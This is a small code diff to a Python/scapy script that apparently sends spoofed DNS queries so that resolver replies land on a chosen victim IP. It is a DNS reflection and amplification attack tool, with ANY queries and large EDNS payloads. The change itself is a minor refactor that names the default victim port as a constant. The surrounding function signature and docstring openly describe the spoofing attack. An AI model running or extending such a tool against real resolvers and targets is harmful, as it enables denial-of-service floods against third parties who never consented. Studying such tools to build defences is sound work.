@@ -15,6 +15,8 @@ from scapy.all import send as scapy_send
 from scapy.layers.dns import DNS, DNSQR, DNSRROPT
 from scapy.layers.inet import IP, UDP
 
+DEFAULT_VICTIM_PORT = 53
+
 QTYPE_MAP = {
     'A': 1, 'AAAA': 28, 'ANY': 255, 'DNSKEY': 48, 'DS': 43,
     'TXT': 16, 'NS': 2, 'CNAME': 5, 'SOA': 6, 'PTR': 12,
@@ -46,7 +48,7 @@ def check_root():
 
 
 def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
-                           victim_src_port=53, qtype='ANY', edns_payload=4096,
+                           victim_src_port=DEFAULT_VICTIM_PORT, qtype='ANY', edns_payload=4096,
                            dnssec_do=False, txid=0x1337, id_random=False,
                            verbose=False, measure=False, qclass=1):
     """Send one spoofed DNS query; resolver replies flow to victim_ip."""
